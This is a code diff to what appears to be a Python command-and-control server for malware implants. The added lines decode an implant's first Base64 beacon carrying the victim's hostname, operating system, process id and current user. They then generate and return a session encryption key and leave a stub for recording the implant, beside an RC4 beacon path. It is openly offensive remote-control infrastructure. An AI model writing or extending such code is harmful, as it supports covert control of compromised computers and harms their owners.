@@ -2,6 +2,8 @@ import base64
 import logging
 import json
 import pymysql
+import random
+import string
 from core.config import *
 from core.message import Message
 from gevent.wsgi import WSGIServer
@@ -78,9 +80,23 @@ class WebServer(object):
 
             # if initial Base64 beacon
             if self.is_base64(raw_data) is True:
-                # TO DO: generate 32 character encryption key
+                # Base64 decodes POST data
+                decoded = base64.b64decode(raw_data).decode()
 
-                return "base64"
+                # parses JSON POST data
+                j = json.loads(decoded)
+                hostname = j["h"]
+                operating_system = j["o"]
+                process_id = j["p"]
+                current_user = j["u"]
+
+                # generates a random 32 character encryption key (upper and lower, no numbers)
+                encryption_key = "".join(random.SystemRandom().choice(string.ascii_letters) for _ in range(32))
+
+                # TO DO: INSERT entry into "implants" table
+
+                # returns Base64 encoded encryption key in the HTTP response
+                return base64.b64encode(encryption_key.encode())
 
             # else RC4 beacon
             else:
